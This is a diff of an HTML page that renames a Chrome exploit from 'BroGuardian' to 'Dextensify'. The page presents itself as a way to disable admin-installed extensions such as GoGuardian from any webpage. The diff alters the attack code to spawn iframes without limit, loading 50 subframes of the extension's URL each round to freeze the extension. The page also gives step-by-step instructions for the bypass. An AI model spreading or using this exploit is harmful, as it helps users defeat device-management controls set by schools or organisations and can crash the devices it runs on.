@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title>BroGuardian</title>
-    <link rel="icon" type="image/x-icon" href="./favicon.ico">
+    <title>Dextensify</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width">
     <style>
@@ -196,7 +195,7 @@
         }
         else if (detected.length === 0) {
           buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
-          buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/BroGuardian">Github repository</a>, and provide the extension ID and manifest.</p>`;
+          buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>`;
           return;
         }
         else {
@@ -214,7 +213,7 @@
       }
 
       function button_handler(extension) {
-        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to the extension tab immediately to prevent the entire device from locking up.");
+        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
         if (cancel) return;
         
         setTimeout(() => {
@@ -227,13 +226,13 @@
         let iterations = 5;
         let public_url = extension.url;
         
-        for (let iframe_count=0; iframe_count<1000; iframe_count++) {
+        while (true) {
           let iframe = document.createElement("iframe");
           document.body.append(iframe);
           iframes.push(iframe);
 
           //let subframe_count = Math.max(2, 200 - iterations);
-          for (let i=0; i<10; i++) {
+          for (let i=0; i<50; i++) {
             let subframe = document.createElement("iframe");
             subframe.src = public_url;
             subframe.style.width = subframe.style.height = "1px";
@@ -254,20 +253,15 @@
   </head>
   <body>
     <div id="main_div">
-      <h1 style="margin-top: 8px">BroGuardian</h1>
-      <p>BroGuardian is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
+      <h1 style="margin-top: 8px">Dextensify</h1>
+      <p>Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
       <h2>Instructions</h2>
       <ol>
         <li>Open chrome://extensions in a new tab. Keep this page open.</li>
-        <br />
-        <li>Go to the settings page for the extension you want to disable. If you are exploiting GoGuardian, go <a href="chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh">here</a>.</li>
-        <br />
-        <li>On the BroGuardian page (here), click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
-        <br />
-        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds. Make sure that once you finish spamming, the switch is in the "off" position.</li>
-        <br />
-        <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" if needed, or if pages start getting blocked again.</li>
-        <br />
+        <li>Go to the settings page for the extension you want to disable.</li>
+        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
+        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
+        <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" again every few minutes, or if pages start getting blocked again.</li>
         <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
       </ol>
       <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
@@ -278,10 +272,10 @@
       <hr>
       <details>
         <summary style="margin-bottom: 8px;">
-          Made by <a href="https://github.com/dandepan606/">dandepan606</a>. This file is licensed under the MIT license.
+          Made by <a href="https://ading.dev" target="_blank">ading2210</a>. This file is licensed under the MIT license.
         </summary>
         <pre>MIT License
-Copyright (c) 2023 dandepan606
+Copyright (c) 2023 ading2210
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
